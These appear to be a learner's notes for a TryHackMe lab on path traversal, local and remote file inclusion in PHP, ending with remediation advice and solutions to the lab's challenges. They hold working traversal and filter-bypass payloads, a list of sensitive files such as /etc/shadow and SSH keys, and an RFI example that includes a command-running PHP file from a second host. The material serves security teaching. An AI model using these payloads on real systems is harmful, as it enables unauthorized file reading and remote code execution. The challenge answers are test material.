# File Inclusion

---

## Introduction

The following diagram breaks down the essential parts of a URL.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png)

- The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

---

## Path Traversal


- Also known as Directory traversal.
- A web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application.
- The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

- Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP.
- It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability.


We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, for example `get.php?file=`, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:

`http://webapp.thm/get.php?file=../../../../boot.ini` or

`http://webapp.thm/get.php?file=../../../../windows/win.ini`

Below are some common OS files you could use when testing. 


| **Location**                | **Description**                                                                                                                                                   |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/issue                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | contains information about the system's users' passwords                                                                                                          |
| /root/.bash_history         | contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id_rsa           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache  webserver                                                                                                                       |
| C:\\boot.ini                | contains the boot options for computers with BIOS firmware                                                                                                        |


---

## Local File Inclusion - LFI


- LFI attacks against web applications are often due to a developers' lack of security awareness. 
- With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications.
- vulnerabilities can occur in PHP, ASP, JSP, Node.js and etc

- LFI exploits follow the same concepts as path traversal.


**Examples LFI #1**:

1. Suppose the web application provides two languages, and the user can select between the EN and AR

```
<?PHP 
	include($_GET["lang"]);
?>
```

The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: `http://webapp.thm/index.php?lang=EN.php` to load the English page or `http://webapp.thm/index.php?lang=AR.php` to load the Arabic page, where EN.php and AR.php files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: `http://webapp.thm/get.php?file=/etc/passwd` 

In this case, it works because there isn't a directory specified in the include function and no input validation.

Now apply what we discussed and try to read /etc/passwd file. Also, answer question #1 below.


2. Next, In the following code, the developer decided to specify the directory inside the function.

```
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

`http://webapp.thm/index.php?lang=../../../../etc/passwd`


**Examples LFI #2**:

In this task, we go a little bit deeper into LFI. We discussed a couple of techniques to bypass the filter within the include function.

1. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

In this scenario, we have the following entry point: `http://webapp.thm/index.php?lang=EN`. If we enter an invalid input, such as THM, we get the following error

```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like:  `include(languages/THM.php);`. 

If you look at the directory closely, we can tell the function includes files in the languages directory is adding `.php` at the end of the entry. Thus the valid input will be something as follows:  `index.php?lang=EN`, where the file EN is located inside the given languages directory and named  `EN.php`. 

Also, the error message disclosed another important piece of information about the full web application directory path which is `/var/www/html/THM-4/`

To exploit this, we need to use the `../` trick, as described in the directory traversal section, to get out the current folder. Let's try the following:

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

It seems we could move out of the PHP directory but still, the `include` function reads the input with `.php` at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is `%00`.

Using null bytes is an injection technique where URL-encoded representation such as `%00` or `0x00` in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:

`include("languages/../../../../../etc/passwd%00").".php");` which equivalent to → `include("languages/../../../../../etc/passwd");`

NOTE: the `%00` trick is fixed and not working with PHP 5.3.4 and above.

2. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to `http://webapp.thm/index.php?lang=/etc/passwd/`. We could also use `http://webapp.thm/index.php?lang=/etc/passwd%00`.

To make it clearer, if we try this concept in the file system using `cd ..`, it will get you back one step; however, if you do `cd .`, It stays in the current directory.  Similarly, if we try  `/etc/passwd/..`, it results to be  /etc/ and that's because we moved one to the root.  Now if we try  `/etc/passwd/.`, the result will be  `/etc/passwd` since dot refers to the current directory.

3. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

We got the following error!

```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

If we check the warning message in the `include(languages/etc/passwd)` section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: `....//....//....//....//....//etc/passwd`

> Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png)

4. Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: `http://webapp.thm/index.php?lang=languages/EN.php` then, to exploit this, we need to include the directory in the payload like so: `?lang=languages/../../../../../etc/passwd`.

---

## Remote File Inclusion - RFI


- Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. 
- Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function.
- One requirement for RFI is that the allow_url_fopen option needs to be on.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
	- Sensitive Information Disclosure
	- Cross-site Scripting (XSS)
	- Denial of Service (DoS)


- An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server.
- Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png)


**RFI Steps**:

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.

<?PHP echo "Hello THM"; ?>

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.

Visit the following lab URL: http://10.10.171.76/playground.php to try out an RFI attack.

---

## Remediation


To prevent the file inclusion vulnerabilities, some common suggestions include:

    1. Keep system and services, including web application frameworks, updated with the latest version.
    2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
    3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
    4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
    5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
    6. Never trust user input, and make sure to implement proper input validation against file inclusion.
    7. Implement whitelisting for file names and locations as well as blacklisting.

---

## Challenge


Steps for testing for LFI

    1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
    2. Enter a valid input to see how the web server behaves.
    3. Enter invalid inputs, including special characters and common file names.
    4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
    5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
    6. Understand the input validation and if there are any filters!
    7. Try the inject a valid entry to read sensitive files

**Answers**

1. `curl -X POST http://10.10.155.196/challenges/chall1.php -d "method=POST&file=/etc/flag1"`

2. `curl -b THM=../../../../etc/flag2%00 http://10.10.155.196/challenges/chall2.php --output -`

3. `curl -X POST http://10.10.155.196/challenges/chall3.php -d "method=POST&file=../../../etc/flag3%00" --output -`

4. 
```
// rfi.txt

<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
  $output=null;
  $retval=null;
  exec('hostname', $output, $retval);
  echo "Returned with status $retval and output:\n";
  print_r($output);
?>

http://10.10.155.196/playground.php?file=http://10.4.96.175/rfi.txt
```

